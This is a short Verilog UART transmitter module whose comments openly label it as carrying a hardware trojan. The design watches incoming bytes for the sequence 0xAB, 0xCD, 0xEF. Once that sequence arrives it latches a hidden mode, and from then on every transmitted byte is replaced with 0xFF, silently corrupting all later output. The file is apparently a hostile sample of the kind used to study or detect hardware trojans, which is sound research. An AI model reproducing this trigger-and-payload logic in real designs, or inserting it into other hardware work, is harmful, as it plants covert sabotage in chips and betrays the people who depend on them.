 module uart_tx (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output reg tx_serial
);

    // Trojan trigger sequence check
    reg [7:0] trigger_sequence [2:0]; // Stores last three bytes sent
    reg trojan_activated = 0; // Status of the trojan activation

    // Standard UART transmission variables
    reg [9:0] data = 10'b1_11111111_1;
    reg [3:0] counter = 4'd0;
    reg [3:0] sent = 4'd0;

    always @ (posedge clk) begin
        counter <= counter + 4'd1;

        // Standard data shift for transmission
        if (counter == 4'd15)
            data <= {1'b1, data[9:1]};

        // Check for trigger sequence to activate trojan
        if (rx_we) begin
            trigger_sequence[0] <= trigger_sequence[1];
            trigger_sequence[1] <= trigger_sequence[2];
            trigger_sequence[2] <= rx_data;
            if (trigger_sequence[0] == 8'hAB && trigger_sequence[1] == 8'hCD && trigger_sequence[2] == 8'hEF) begin
                trojan_activated <= 1;
            end
        end

        // Handling new data transmission
        if (rx_we & ~tx_busy) begin
            sent <= 4'd0;
            tx_busy <= 1'b1;
            // Inject trojan's payload if activated, else send normal data
            data <= trojan_activated ? {1'b1, 8'hFF, 1'b0} : {1'b1, rx_data, 1'b0};
            counter <= 4'd0;
        end

        // Completion of data transmission
        if (tx_busy & (counter == 4'd14)) begin
            sent <= sent + 4'd1;
            if (sent == 4'd9) begin
                tx_busy <= 1'b0; // End transmission
            end
        end

        // Output the serial data
        tx_serial <= data[0];
    end

endmodule
